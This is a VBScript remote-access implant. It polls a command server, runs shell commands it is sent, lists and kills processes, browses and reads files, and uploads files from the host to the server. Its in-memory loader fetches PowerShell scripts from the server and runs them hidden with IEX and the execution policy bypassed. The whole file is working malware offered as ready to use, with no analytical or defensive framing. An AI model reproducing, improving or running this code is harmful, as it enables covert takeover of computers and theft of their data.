Option Explicit

Dim strServer, objShell, objFSO, strTempFile, clientID, currentDir
' --- CONFIGURATION ---
strServer = "http://192.168.0.20:8080"
' ---------------------

Set objShell = CreateObject("WScript.Shell")
Set objFSO = CreateObject("Scripting.FileSystemObject")
strTempFile = objShell.ExpandEnvironmentStrings("%TEMP%") & "\pylog.dat"

' Session Init
currentDir = objShell.CurrentDirectory
Dim objNet: Set objNet = CreateObject("WScript.Network")
clientID = objNet.ComputerName & "-" & objNet.UserName

' --- MAIN LOOP ---
Do
    Dim strCommand
    ' Check-in (Sends CWD in header for server prompt)
    strCommand = DoWebReq("GET", strServer, "", "TEXT")
    
    If strCommand <> "NOOP" And strCommand <> "" Then
        ProcessCommand strCommand
    End If
    
    ' Jitter (3-4 seconds)
    WScript.Sleep 3000 + Int(1000 * Rnd)
Loop

Sub ProcessCommand(cmdStr)
    On Error Resume Next
    Dim action, arg
    
    If InStr(cmdStr, " ") > 0 Then
        action = Left(cmdStr, InStr(cmdStr, " ") - 1)
        arg = Mid(cmdStr, InStr(cmdStr, " ") + 1)
    Else
        action = cmdStr
        arg = ""
    End If

    Select Case UCase(action)
        Case "INVOKE"
            InvokePowerShell arg
        Case "SHELL"
            ExecShell arg
        Case "CD"
            ChangeDirectory arg
        Case "PWD"
            SendOutput currentDir
        Case "LS", "DIR"
            ListDirectory currentDir
        Case "CAT", "TYPE"
            CatFile arg
        Case "DOWNLOAD"
            UploadFile arg
        Case "PS"
            ExecShell "tasklist"
        Case "KILL"
            ExecShell "taskkill /F /PID " & arg
        Case "EXIT"
            WScript.Quit
    End Select
End Sub

' --- IN-MEMORY LOADER (PRODUCTION READY) ---
Sub InvokePowerShell(scriptName)
    On Error Resume Next
    
    ' 1. Verify Script Exists on Server (HEAD Check)
    Dim psUrl: psUrl = strServer & "/scripts/" & scriptName
    Dim Http: Set Http = CreateObject("WinHttp.WinHttpRequest.5.1")
    Http.Open "GET", psUrl, False
    Http.Send
    
    If Http.Status <> 200 Then
        SendOutput "Error: Server returned " & Http.Status & " (Script not found?)"
        Exit Sub
    End If
    
    ' 2. Execute with Stream Merging (*>&1)
    ' This captures Write-Host, Write-Error, and Standard Output
    Dim psCmd
    psCmd = "powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command " & _
            Chr(34) & "IEX ((New-Object Net.WebClient).DownloadString('" & psUrl & "')) *>&1 | Out-String | Out-File '" & strTempFile & "' -Encoding ASCII" & Chr(34)
            
    objShell.Run psCmd, 0, True
    
    ' 3. Upload Results
    If objFSO.FileExists(strTempFile) Then
        Dim f: Set f = objFSO.OpenTextFile(strTempFile, 1)
        If Not f.AtEndOfStream Then
            SendOutput f.ReadAll
        Else
            SendOutput "[*] Script executed (No Output Captured)"
        End If
        f.Close
    Else
        SendOutput "Error: Execution failed (Temp file not created)."
    End If
End Sub

' --- UTILITIES ---

Sub ExecShell(cmd)
    On Error Resume Next
    objShell.CurrentDirectory = currentDir
    ' Capture StdOut and StdErr
    objShell.Run "%COMSPEC% /c " & cmd & " > """ & strTempFile & """ 2>&1", 0, True
    
    If objFSO.FileExists(strTempFile) Then
        Dim f: Set f = objFSO.OpenTextFile(strTempFile, 1)
        SendOutput f.ReadAll
        f.Close
    End If
End Sub

Sub ChangeDirectory(newPath)
    On Error Resume Next
    Dim targetPath
    If newPath = ".." Then
        targetPath = objFSO.GetParentFolderName(currentDir)
    Else
        targetPath = objFSO.BuildPath(currentDir, newPath)
    End If
    
    If objFSO.FolderExists(targetPath) Then
        currentDir = targetPath
        objShell.CurrentDirectory = currentDir
        SendOutput "CWD: " & currentDir
    Else
        SendOutput "Error: Path not found."
    End If
End Sub

Sub ListDirectory(path)
    On Error Resume Next
    Dim folder, item, out
    Set folder = objFSO.GetFolder(path)
    out = "Directory: " & path & vbCrLf & vbCrLf
    For Each item in folder.SubFolders
        out = out & "<DIR> " & item.Name & vbCrLf
    Next
    For Each item in folder.Files
        out = out & "      " & item.Name & vbTab & "(" & item.Size & "b)" & vbCrLf
    Next
    SendOutput out
End Sub

Sub CatFile(filename)
    On Error Resume Next
    Dim path: path = objFSO.BuildPath(currentDir, filename)
    If objFSO.FileExists(path) Then
        Dim f: Set f = objFSO.OpenTextFile(path, 1)
        SendOutput f.ReadAll
        f.Close
    Else
        SendOutput "File not found."
    End If
End Sub

Sub UploadFile(filename)
    On Error Resume Next
    Dim path: path = objFSO.BuildPath(currentDir, filename)
    If objFSO.FileExists(path) Then
        Dim stream: Set stream = CreateObject("ADODB.Stream")
        stream.Type = 1: stream.Open: stream.LoadFromFile path
        
        Dim Http: Set Http = CreateObject("WinHttp.WinHttpRequest.5.1")
        Http.Open "POST", strServer, False
        Http.SetRequestHeader "X-ID", clientID
        Http.SetRequestHeader "X-Type", "FILE"
        Http.SetRequestHeader "X-FileName", filename
        Http.Send stream.Read
        stream.Close
    Else
        SendOutput "File not found."
    End If
End Sub

Sub SendOutput(txt)
    DoWebReq "POST", strServer, txt, "TEXT"
End Sub

Function DoWebReq(method, url, data, dataType)
    On Error Resume Next
    Dim Http: Set Http = CreateObject("WinHttp.WinHttpRequest.5.1")
    Http.Open method, url, False
    Http.SetRequestHeader "X-ID", clientID
    Http.SetRequestHeader "X-CWD", currentDir
    If UCase(method) = "POST" Then
        Http.SetRequestHeader "X-Type", dataType
        Http.Send data
    Else
        Http.Send
    End If
    If Http.Status = 200 Then DoWebReq = Http.ResponseText Else DoWebReq = "NOOP"
End Function